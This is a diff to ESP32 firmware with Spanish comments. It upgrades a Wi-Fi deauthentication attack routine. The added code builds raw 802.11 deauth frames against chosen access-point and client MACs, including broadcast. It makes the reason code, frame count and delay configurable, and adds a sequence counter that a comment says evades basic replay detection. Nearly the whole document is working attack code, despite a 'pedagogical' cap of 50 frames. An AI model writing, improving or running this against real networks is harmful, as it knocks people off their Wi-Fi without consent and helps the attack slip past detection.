@@ -27,7 +27,10 @@ uint8_t target_channel = 1;
 uint8_t clients_target_bssid[6] = {0};
 uint8_t clients_channel = 1;
 
-void send_deauth_frame(uint8_t* dest_mac, uint8_t* bssid, uint8_t channel);
+// Sequence counter propio para frames deauth (evita replay detection básico)
+static uint16_t deauth_seq_counter = 0;
+
+void send_deauth_frame(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t reason_code);
 
 // Función segura para leer el estado
 SystemState get_state() {
@@ -216,111 +219,172 @@ void parse_lock_command(const String& cmd) {
 
 // Variables globales para tarea de deauth no-bloqueante
 TaskHandle_t deauth_task_handle = NULL;
-uint8_t deauth_target_mac[6] = {0};
+uint8_t deauth_ap_mac[6] = {0};
+uint8_t deauth_client_mac[6] = {0};
 uint8_t deauth_channel = 1;
+uint8_t deauth_reason = 7;       // Reason code por defecto: Class 3 frame received
 uint8_t deauth_count = 0;
-char deauth_mac_str[18] = {0};
+uint16_t deauth_delay_ms = 100;  // Delay entre frames
+char deauth_ap_str[18] = {0};
+char deauth_client_str[18] = {0};
 
 void deauth_task(void *pvParameter) {
+  // Fijar canal del objetivo
   esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
   set_state(DEAUTH);
-  Serial.printf("DEAUTH: Enviando %d frames a %s en canal %d\n", deauth_count, deauth_mac_str, deauth_channel);
   
+  Serial.printf("[DEAUTH] Target AP: %s | Client: %s | Reason: %d | Frames: %d | Delay: %dms\n",
+                deauth_ap_str, deauth_client_str, deauth_reason, deauth_count, deauth_delay_ms);
+  
+  uint8_t frames_sent = 0;
   for (int i = 0; i < deauth_count; i++) {
-    if (get_state() != DEAUTH) break; // Permitir cancelación
-    send_deauth_frame(deauth_target_mac, deauth_target_mac, deauth_channel);
-    vTaskDelay(pdMS_TO_TICKS(100));
+    if (get_state() != DEAUTH) break; // Cancelación limpia vía IDLE
+    
+    send_deauth_frame(deauth_ap_mac, deauth_client_mac, deauth_reason);
+    frames_sent++;
+    
+    // Log cada 5 frames o el último para no saturar serial
+    if (i % 5 == 0 || i == deauth_count - 1) {
+      Serial.printf("[DEAUTH] Frame %d/%d enviado\n", i + 1, deauth_count);
+    }
+    
+    // Rate limiting configurable
+    if (deauth_delay_ms > 0) {
+      vTaskDelay(pdMS_TO_TICKS(deauth_delay_ms));
+    }
   }
   
-  Serial.printf("DEAUTH: Enviados %d frames a %s\n", deauth_count, deauth_mac_str);
+  Serial.printf("[DEAUTH] Completado: %d frames enviados a %s\n", frames_sent, deauth_ap_str);
   set_state(IDLE);
   deauth_task_handle = NULL;
   vTaskDelete(NULL);
 }
 
 void parse_deauth_command(const String& cmd) {
-  // Expected format: CMD:DEAUTH:AA:BB:CC:DD:EE:FF:CHANNEL:COUNT
+  // Nuevo formato: CMD:DEAUTH:AP_MAC:CLIENT_MAC:REASON:COUNT:DELAY_MS
+  // Ej: CMD:DEAUTH:AA:BB:CC:DD:EE:FF:FF:FF:FF:FF:FF:FF:7:10:100
   String cmd_copy = cmd;
   cmd_copy.trim();
-  String args = cmd_copy.substring(11);
-  int first_colon = args.indexOf(':');
-  if (first_colon == -1) return;
+  String args = cmd_copy.substring(11); // Saltar "CMD:DEAUTH:"
   
-  String mac_str = args.substring(0, first_colon);
-  String rest = args.substring(first_colon + 1);
-  int second_colon = rest.indexOf(':');
-  if (second_colon == -1) return;
+  // Parsear campos separados por ':'
+  // Campos: AP_MAC(6 octetos) + CLIENT_MAC(6 octetos) + REASON + COUNT + DELAY_MS
+  // Total mínimo: 17 chars (MAC) + 1 + 17 chars (MAC) + 1 + 1-3 + 1 + 1-3 + 1 + 1-5
+  int hex_vals[12]; // 6 para AP + 6 para client
+  int reason, count, delay_ms;
   
-  String ch_str = rest.substring(0, second_colon);
-  String count_str = rest.substring(second_colon + 1);
+  // Usar sscanf para parsear todo de una vez
+  // Formato: XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:XX:REASON:COUNT:DELAY
+  int parsed = sscanf(args.c_str(),
+    "%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%d:%d:%d",
+    &hex_vals[0], &hex_vals[1], &hex_vals[2], &hex_vals[3], &hex_vals[4], &hex_vals[5],
+    &hex_vals[6], &hex_vals[7], &hex_vals[8], &hex_vals[9], &hex_vals[10], &hex_vals[11],
+    &reason, &count, &delay_ms);
   
-  uint8_t channel = ch_str.toInt();
-  uint8_t count = count_str.toInt();
-  
-  if (channel < 1 || channel > 14) {
-    Serial.println("DEAUTH: Canal inválido (1-14).");
-    return;
-  }
-  if (count < 1 || count > 100) {
-    Serial.println("DEAUTH: Count inválido (1-100).");
+  if (parsed < 13) {
+    Serial.println("ERR: Formato DEAUTH inválido. Esperado: AP_MAC:CLIENT_MAC:REASON:COUNT[:DELAY_MS]");
     return;
   }
   
-  int hex_vals[6];
-  if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
-             &hex_vals[0], &hex_vals[1], &hex_vals[2],
-             &hex_vals[3], &hex_vals[4], &hex_vals[5]) != 6) {
-    Serial.println("DEAUTH: Error parsing MAC address.");
+  // Validar canal (se extrae del estado actual o se usa 1 por defecto)
+  uint8_t channel = target_channel;
+  if (channel < 1 || channel > 14) channel = 1;
+  
+  // Validar reason code (1-255)
+  if (reason < 1 || reason > 255) {
+    Serial.println("ERR: Reason code inválido (1-255).");
     return;
   }
+  
+  // Validar count (1-50, límite pedagógico)
+  if (count < 1 || count > 50) {
+    Serial.println("ERR: Count inválido (1-50). Límite pedagógico por seguridad.");
+    return;
+  }
+  
+  // Validar delay_ms (10-5000)
+  if (parsed >= 15) {
+    if (delay_ms < 10 || delay_ms > 5000) {
+      Serial.println("ERR: Delay inválido (10-5000 ms).");
+      return;
+    }
+  } else {
+    delay_ms = 100; // Default
+  }
+  
+  // Copiar MACs
   for (int i = 0; i < 6; i++) {
-    deauth_target_mac[i] = (uint8_t)hex_vals[i];
+    deauth_ap_mac[i] = (uint8_t)hex_vals[i];
+    deauth_client_mac[i] = (uint8_t)hex_vals[i + 6];
   }
   
-  // Si ya hay una tarea de deauth corriendo, cancelarla
+  // Formatear strings para log
+  snprintf(deauth_ap_str, sizeof(deauth_ap_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+           deauth_ap_mac[0], deauth_ap_mac[1], deauth_ap_mac[2],
+           deauth_ap_mac[3], deauth_ap_mac[4], deauth_ap_mac[5]);
+  snprintf(deauth_client_str, sizeof(deauth_client_str), "%02X:%02X:%02X:%02X:%02X:%02X",
+           deauth_client_mac[0], deauth_client_mac[1], deauth_client_mac[2],
+           deauth_client_mac[3], deauth_client_mac[4], deauth_client_mac[5]);
+  
+  // Cancelar tarea previa si existe
   if (deauth_task_handle != NULL) {
     vTaskDelete(deauth_task_handle);
     deauth_task_handle = NULL;
   }
   
   deauth_channel = channel;
-  deauth_count = count;
-  snprintf(deauth_mac_str, sizeof(deauth_mac_str), "%s", mac_str.c_str());
+  deauth_reason = (uint8_t)reason;
+  deauth_count = (uint8_t)count;
+  deauth_delay_ms = (uint16_t)delay_ms;
+  
+  // Reset sequence counter para nueva sesión
+  deauth_seq_counter = 0;
   
   xTaskCreate(&deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
 }
 
-void send_deauth_frame(uint8_t* dest_mac, uint8_t* bssid, uint8_t channel) {
-  // Estructura del frame deauth (26 bytes)
+void send_deauth_frame(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t reason_code) {
+  // Frame deauth 802.11: Management frame, subtype 0xC0 (Deauthentication)
+  // Tamaño: 26 bytes (sin FCS, lo añade el hardware si se pide)
   uint8_t deauth_frame[26] = {0};
   
-  // Frame Control (0xC0 0x00) - Deauthentication
+  // Frame Control: 0xC0 0x00
+  // Bit 0-1: Version 0, Bit 2-3: Type 0 (Management), Bit 4-7: Subtype 12 (0xC = Deauth)
   deauth_frame[0] = 0xC0;
   deauth_frame[1] = 0x00;
   
-  // Duration (0x00 0x00)
+  // Duration ID: 0x0000 (no usado en deauth)
   deauth_frame[2] = 0x00;
   deauth_frame[3] = 0x00;
   
-  // Dest MAC (6 bytes)
-  memcpy(&deauth_frame[4], dest_mac, 6);
+  // Address 1: Destination (client MAC o broadcast FF:FF:FF:FF:FF:FF)
+  memcpy(&deauth_frame[4], client_mac, 6);
   
-  // Source MAC (6 bytes) - BSSID (AP)
-  memcpy(&deauth_frame[10], bssid, 6);
+  // Address 2: Source (AP MAC / BSSID)
+  memcpy(&deauth_frame[10], ap_mac, 6);
   
-  // BSSID (6 bytes)
-  memcpy(&deauth_frame[16], bssid, 6);
+  // Address 3: BSSID (AP MAC, mismo que source en deauth simple)
+  memcpy(&deauth_frame[16], ap_mac, 6);
   
-  // Sequence Control (0x00 0x00)
-  deauth_frame[22] = 0x00;
-  deauth_frame[23] = 0x00;
+  // Sequence Control: 16 bits
+  // Bits 0-3: Fragment number (0 = no fragmentado)
+  // Bits 4-15: Sequence number (incrementar para evitar replay detection)
+  uint16_t seq = (deauth_seq_counter & 0x0FFF) << 4; // Sequence number en bits altos
+  deauth_seq_counter++;
+  deauth_frame[22] = (uint8_t)(seq & 0xFF);
+  deauth_frame[23] = (uint8_t)((seq >> 8) & 0xFF);
   
-  // Reason Code (0x07 0x00) - Class 3 frame received from nonassociated STA
-  deauth_frame[24] = 0x07;
-  deauth_frame[25] = 0x00;
+  // Reason Code: 1 byte (el segundo byte es padding en frame deauth)
+  // 1 = Unspecified, 2 = Previous auth invalid, 7 = Class 3 frame from nonassoc STA
+  deauth_frame[24] = reason_code;
+  deauth_frame[25] = 0x00; // Padding
   
-  // Enviar frame raw usando esp_wifi_80211_tx
-  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+  // Enviar frame raw por la interfaz STA
+  // Parámetro false = no incluir FCS (el hardware lo calcula automáticamente)
+  esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+  if (ret != ESP_OK) {
+    Serial.printf("[DEAUTH] ERR: esp_wifi_80211_tx failed (0x%x)\n", ret);
+  }
 }
 
 // Variables globales para tarea de clients no-bloqueante
